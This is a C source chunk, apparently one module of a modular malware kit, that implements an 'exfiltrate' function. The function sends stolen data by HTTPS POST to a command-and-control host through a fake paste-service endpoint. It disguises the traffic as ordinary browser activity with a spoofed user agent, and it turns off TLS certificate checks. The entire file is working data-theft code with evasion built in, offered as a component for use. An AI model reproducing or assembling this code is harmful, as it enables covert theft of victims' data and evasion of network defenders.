// chunk: exfil/paste_site
// depends: (none)
// provides: exfiltrate
// headers: windows.h, winhttp.h
// libs: winhttp
// note: HTTPS POST to paste service — looks like normal browsing traffic

#ifndef CHUNK_EXFIL_PASTE_SITE
#define CHUNK_EXFIL_PASTE_SITE

#include <winhttp.h>

static int exfiltrate(const char *data, int len, const char *c2_host, int c2_port) {
    (void)c2_port;

    HINTERNET session = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return 0;

    wchar_t whost[256];
    MultiByteToWideChar(CP_UTF8, 0, c2_host, -1, whost, 256);

    HINTERNET conn = WinHttpConnect(session, whost,
                                     INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!conn) { WinHttpCloseHandle(session); return 0; }

    HINTERNET req = WinHttpOpenRequest(conn, L"POST", L"/api/v1/paste",
                                        NULL, WINHTTP_NO_REFERER,
                                        WINHTTP_DEFAULT_ACCEPT_TYPES,
                                        WINHTTP_FLAG_SECURE);
    if (!req) {
        WinHttpCloseHandle(conn);
        WinHttpCloseHandle(session);
        return 0;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(req, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    BOOL ok = WinHttpSendRequest(req,
        L"Content-Type: application/x-www-form-urlencoded\r\n",
        -1L, (LPVOID)data, (DWORD)len, (DWORD)len, 0);

    int result = 0;
    if (ok && WinHttpReceiveResponse(req, NULL)) {
        DWORD status = 0, sz = sizeof(status);
        WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            NULL, &status, &sz, NULL);
        result = (status >= 200 && status < 300);
    }

    WinHttpCloseHandle(req);
    WinHttpCloseHandle(conn);
    WinHttpCloseHandle(session);
    return result;
}

#endif
